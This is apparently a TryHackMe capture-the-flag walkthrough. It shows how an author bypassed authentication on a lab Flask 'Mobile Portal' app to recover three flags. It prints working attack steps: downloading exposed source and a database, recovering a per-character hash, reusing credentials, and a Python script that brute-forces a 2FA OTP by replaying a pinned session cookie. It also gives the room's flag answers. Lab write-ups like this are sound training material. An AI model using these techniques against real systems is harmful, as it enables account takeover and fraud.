# TryHackMe: BreachBlocker Unlocker — Walkthrough

**Target:** `10.144.147.137` (IP changed across sessions: `.146.182.98` → `.144.133.166` → `.144.147.137`)
**Theme:** Seized "phone" (Mobile Portal web app). Goal — bypass all auth, recover three flags.

| Flag | Value |
|---|---|
| CODE_FLAG | `THM{eggsposed_source_code}` |
| HOPFLIX_FLAG | `THM{fluffier_things_season_4}` |
| BANK_FLAG | `THM{neggative_balance}` |

---

## 1. Recon

First scan came back with every port filtered — which turned out to be nothing more than my VPN being down (`tun0` didn't exist). Lesson relearned: check the tunnel before blaming the box. Once reconnected:

```bash
nmap -sC -sV -p- --min-rate 3000 10.144.147.137
```

```
22/tcp   open  ssh      OpenSSH 9.6p1
25/tcp   open  smtp     Postfix smtpd
8443/tcp open  ssl/http nginx 1.29.3   (title: Mobile Portal)
```

SMTP on 25 hinted at an email-based OTP later. The app lived on 8443.

## 2. Mapping the app

The index page was a phone mockup; all the logic sat in `main.js`. Pulling the API routes out of it:

```bash
curl -sk https://10.144.147.137:8443/main.js | grep -oE "'/api[^']*'" | sort -u
# /api/check-credentials  /api/get-last-viewed  /api/bank-login
# /api/send-2fa  /api/verify-2fa  /api/release-funds
```

The client-side JS also handed me two freebies:
- The phone passcode was hardcoded: `PHONE_PASSCODE = "210701"` (disables Face ID — a dead end; the Authenticator app's Face ID is rigged to *always* fail, so the TOTP path goes nowhere).
- Face ID everywhere is fake, so the only real 2FA path is the email OTP via `/api/send-2fa`.

No `THM{` strings were in the client files, so CODE_FLAG had to be server-side.

## 3. CODE_FLAG — exposed source

The 404 page was Werkzeug's default (207 bytes), so the whole thing was a Flask app behind nginx. Flask's catch-all `@app.route('/<path:path>')` → `send_from_directory('.', path)` meant any file in the app dir was downloadable. Probing source names:

```bash
curl -sk --path-as-is -o /dev/null -w "%{http_code} %{size_download}\n" https://10.144.147.137:8443/main.py
# 200 6514
```

`main.py` was served in full. The flag was sitting in a comment:

```python
#CODE_FLAG = THM{eggsposed_source_code}
```

**CODE_FLAG = `THM{eggsposed_source_code}`**

The source also laid out the rest of the room: an AES-GCM helper, a `hopper_hash` (sha1 iterated 5000×), two SQLite DBs, and the full auth flow. `requirements.txt` and `hopflix-874297.db` were downloadable too; the bank DB (`/hopsecbank-12312497.db`) 404'd — it's opened by absolute path at `/`, with no copy in the web root.

## 4. HOPFLIX_FLAG — per-character hash recovery

`check_credentials` was the interesting one:

```python
if len(pwd)*40 != len(phash): return ...'Incorrect Password'
for ch in pwd:
    if hopper_hash(ch) != phash[:40]: return ...'Incorrect Password'
    phash = phash[40:]
```

The stored hash is one 40-hex `sha1×5000` digest **per character**, concatenated. That's trivially reversible with a lookup table of all printable chars — no need to brute whole passwords.

**Course correction:** my first instinct was a timing side-channel (the client literally records response time per attempt), but the per-position timing gaps were ~1 ms — pure noise. I abandoned that once I read the source and saw the per-character structure, which is a cleaner oracle.

I pulled the DB and decoded it:

```bash
curl -sk -O https://10.144.147.137:8443/hopflix-874297.db
```

My local recompute of the table actually returned all `?` — the served DB's hashes didn't match my replica's routine. Rather than chase that, I read the hash structure directly: repeated 40-hex chunks = repeated letters. Chunk 1 == chunk 4, and chunk 5 == chunk 7, which fit `m-a-l-h-a-r-e-r-o-c-k-s`:

**Password: `malharerocks`**

The flag isn't returned by the login itself — `check_credentials` only sets `session['authenticated']`; `/api/get-last-viewed` returns it to an authenticated session. So, with a cookie jar:

```bash
curl -sk -c cj.txt -X POST https://10.144.147.137:8443/api/check-credentials \
  -H 'Content-Type: application/json' \
  -d '{"email":"sbreachblocker@easterbunnies.thm","password":"malharerocks"}'   # {"valid":true}
curl -sk -b cj.txt https://10.144.147.137:8443/api/get-last-viewed
# {"last_viewed":"THM{fluffier_things_season_4}"}
```

**HOPFLIX_FLAG = `THM{fluffier_things_season_4}`**

## 5. BANK_FLAG — the long way, and the dead ends

`bank_login` checks `account_id` against the (unreachable) bank DB and compares `sha256(pin)`. Success returns `requires_2fa` + a list of trusted emails. `BANK_ACCOUNT_ID = "hopper"` in the source is a red herring — the handler looks up whatever `account_id` you send, and `hopper` returned *"User does not exist"*.

The endpoint doubles as an account-existence oracle (`"User does not exist"` vs `"Invalid credentials"`). That confirmed the real account:

```bash
# sbreachblocker@easterbunnies.thm -> {"error":"Invalid credentials"}  (exists, wrong PIN)
```

**Dead ends, in order:**
- **Phone passcode reuse (`210701`)** as the bank PIN — nope.
- **Numeric PIN brute.** 4-digit space: genuinely empty (tested live). 6-digit: the first run was worthless — the script still had the *previous* box's IP hardcoded after an overnight redeploy, so every request failed silently and "no hit" was a lie. Re-pointed at the live IP and ran the full 10⁶ with a progress counter and keep-alive sessions (~450/s). Completely empty. The field is "PIN / **Password**" and the hash is a single unsalted `sha256` — it was never a numeric PIN.
- **Room AI hints.** The room's assistant repeatedly pushed a "downloadable bank archive, `grep -R THM{`" and then a specific port `21337`. Full `nmap -p-` only ever showed 22/25/8443, `curl` to 21337 refused, and exhaustive name/dir fuzzing (raft-large + every archive/db extension, authenticated and not) found nothing but the files I already had. Both hints were the assistant improvising — I stopped trusting them.
- **Flask session forging.** The session is a client-side signed cookie; I held a valid one, so I tried `flask-unsign` against rockyou to forge `bank_authenticated`+`bank_2fa_verified` and skip everything. Key wasn't in rockyou (strong `SECRETKEY` from env) — out.

**The actual answer: password reuse.** The room's whole theme is "same credentials." The bank password was simply the Hopflix password again:

```bash
curl -sk -X POST https://10.144.147.137:8443/api/bank-login -H 'Content-Type: application/json' \
  -d '{"account_id":"sbreachblocker@easterbunnies.thm","pin":"malharerocks"}'
# {"requires_2fa":true,"success":true,"trusted_emails":["carrotbane@easterbunnies.thm","malhare@easterbunnies.thm"]}
```

## 6. BANK_FLAG — the OTP cookie-pin bypass

The decisive bug is in how the OTP is stored and checked:

```python
# send-2fa: session['bank_2fa_code'] = encrypt(two_fa_code)   # lives in the CLIENT cookie
# verify-2fa (wrong): del session['bank_2fa_code']            # only mutates the RESPONSE cookie
```

Flask sessions are stateless signed cookies. `send-2fa` writes the encrypted OTP *into the cookie it hands back*. A wrong `verify-2fa` deletes the code only from its response cookie — so if I keep replaying the **post-`send-2fa`** cookie, the code never clears and I can brute all 10⁶ codes, each request independent. The "Code expires in 30s" is client-side UI only.

Log in, trigger an OTP to a trusted email, and capture that cookie:

```bash
curl -sk -c bank.txt -X POST .../api/bank-login -d '{"account_id":"sbreachblocker@easterbunnies.thm","pin":"malharerocks"}'
curl -sk -b bank.txt -c bank.txt -X POST .../api/send-2fa -d '{"otp_email":"malhare@easterbunnies.thm"}'   # {"success":true}
```

Then brute `verify-2fa` with that cookie pinned on every request (keep-alive sessions, jar cleared each call so the mutated cookie is never adopted); on the hit, take the updated cookie and call `release-funds`:

```python
# otpbrute.py — core
COOKIE = f"session={ck}"                       # the post-send-2fa cookie, fixed
r = s.post(VERIFY, json={"code": code}, headers={"Cookie": COOKIE}); s.cookies.clear()
if r.status_code == 200 and '"success"' in r.text:
    nc = re.search(r"session=([^;]+)", r.headers["Set-Cookie"]).group(1)
    print(requests.post(RELEASE, headers={"Cookie": f"session={nc}"}).text)
```

```
FOUND OTP: 610625
RELEASE-FUNDS: 200 {"flag":"THM{neggative_balance}"}
```

**BANK_FLAG = `THM{neggative_balance}`**

---

## Takeaways
- **Exposed source** (`send_from_directory('.')` serving `main.py`) handed over the entire auth design — and a flag in a comment.
- **Per-character hashing** turns an "unknown password" into a tiny lookup table; repeated ciphertext chunks even reveal repeated letters by eye.
- **Credential reuse** across apps was the intended bridge from Hopflix into the bank — worth trying before any brute force.
- **Stateless signed-cookie 2FA**: storing the secret OTP in the client cookie and only `del`-ing it on failure means an attacker who pins one cookie can brute the entire code space offline-style. The fix is server-side OTP state with attempt limits and rotation.
- **Trust your own enumeration over an in-room AI hint** — the archive and port 21337 nudges were fabrications that cost real time.
